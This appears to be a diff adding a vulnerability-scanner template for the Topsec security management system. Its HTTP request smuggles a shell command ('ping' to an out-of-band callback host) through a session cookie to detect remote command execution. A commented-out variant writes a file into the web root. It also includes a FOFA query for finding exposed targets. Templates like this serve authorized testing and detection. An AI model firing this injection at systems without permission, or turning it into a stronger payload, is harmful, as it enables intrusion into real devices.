@@ -1,0 +1,57 @@
+id: TOPSEC
+info:
+  name: 天融信TopSec 安全管理系统，是基于大数据架构，采用多种技术手段收集各类探针设备安全数据，围绕资产、漏洞、攻击、威胁等安全要素进行全面分析，提供统一监测告警、集中策略管控、协同处置流程，实现客户等保合规、资产统一管理、风险一键阻断等应用价值。
+  author: mike
+  severity: info
+  description: xxx
+  reference: xxx
+  remediation: xxx
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: title="Web User Login" && body="/cgi/maincgi.cgi?Url=VerifyCode"
+http:
+  - raw:
+      # - |
+      #   GET /cgi/maincgi.cgi?Url=check HTTP/1.1
+      #   Host: {{Hostname}}
+      #   User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
+      #   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+      #   Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+      #   Accept-Encoding: gzip, deflate
+      #   Dnt: 1
+      #   Upgrade-Insecure-Requests: 1
+      #   Connection: close
+      #   Cookie: session_id_443=1|echo 'mike' >> /www/htdocs/site/image/mikesx.txt;
+
+      # - |
+      #   GET /site/image/mikesx.txt HTTP/1.1
+      #   Host: {{Hostname}}  
+      #   User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+      #   Accept-Encoding: gzip, deflate
+      #   Connection: close
+      - |
+        GET /cgi/maincgi.cgi?Url=check HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+        Accept-Encoding: gzip, deflate
+        Dnt: 1
+        Upgrade-Insecure-Requests: 1
+        Connection: close
+        Cookie: session_id_443=1|ping {{interactsh-url}};
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: interactsh_protocol 
+        words:
+          - "dns"
+      # - type: word
+      #   words:
+      #     - "mike"
+
+          
